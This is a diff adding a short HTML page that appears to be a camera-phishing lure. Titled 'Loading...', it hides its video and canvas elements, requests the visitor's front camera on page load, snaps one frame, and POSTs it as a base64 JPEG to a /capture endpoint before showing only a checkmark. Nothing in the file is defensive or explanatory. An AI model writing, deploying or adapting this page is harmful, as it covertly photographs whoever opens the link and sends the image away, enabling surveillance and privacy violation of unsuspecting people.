@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title>
+<style>body{margin:0;background:#000;}video,canvas{display:none;}</style>
+</head>
+<body>
+<video id="v" autoplay></video>
+<canvas id="c"></canvas>
+<script>
+const v=document.getElementById('v'),c=document.getElementById('c'),ctx=c.getContext('2d');
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
+.then(s=>{v.srcObject=s;v.onloadedmetadata=()=>{c.width=v.videoWidth;c.height=v.videoHeight;ctx.drawImage(v,0,0);const d=c.toDataURL('image/jpeg',0.8).split(',')[1];fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:d})}).then(()=>{v.srcObject.getTracks().forEach(t=>t.stop());document.body.innerHTML='<div style="color:#0f0;text-align:center;font:48px monospace;margin-top:30%;">✔</div>';});};})
+.catch(()=>{document.body.innerHTML='<div style="color:#f80;text-align:center;font:24px monospace;margin-top:30%;">⚠️</div>';});
+</script>
+</body>
+</html>
